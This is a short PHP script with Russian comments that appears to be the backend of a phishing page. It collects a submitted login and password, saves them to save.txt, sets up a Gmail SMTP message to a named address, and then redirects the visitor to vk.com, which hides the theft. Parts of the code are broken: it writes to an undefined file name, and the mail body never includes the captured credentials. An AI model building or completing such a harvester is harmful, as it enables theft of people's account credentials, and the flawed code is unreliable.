<?php
    $login = $_POST["login"]; // вот мы получаем значение текстового поля =)
    $pass = $_POST["pass"];
    $result = "Login: $login | Password: $pass";
    file_put_contents("$text.php", "Тест в файл", FILE_APPEND);
    $filed = "save.txt";
	$rez = $result;
	file_put_contents($filed, $rez);
// Оповещаем пользователя о том, что файл не был загружен


require_once "Mail.php";

$from = '<from.gmail.com>';
$to = '<dim.zaikin2013@gmail.com>';
$subject = 'Hi!';
$body = "Hi,\n\nHow are you?";

$headers = array(
    'From' => $from,
    'To' => $to,
    'Subject' => $subject
);

$smtp = Mail::factory('smtp', array(
        'host' => 'ssl://smtp.gmail.com',
        'port' => '465',
        'auth' => true,
        'username' => 'johndoe@gmail.com',
        'password' => 'passwordxxx'
    ));

$mail = $smtp->send($to, $headers, $body);

if (PEAR::isError($mail)) {
    echo('<p>' . $mail->getMessage() . '</p>');
} else {
    echo('<p>Message successfully sent!</p>');
}
?>

<script type="text/javascript">
	window.open('https://www.vk.com/');
</script>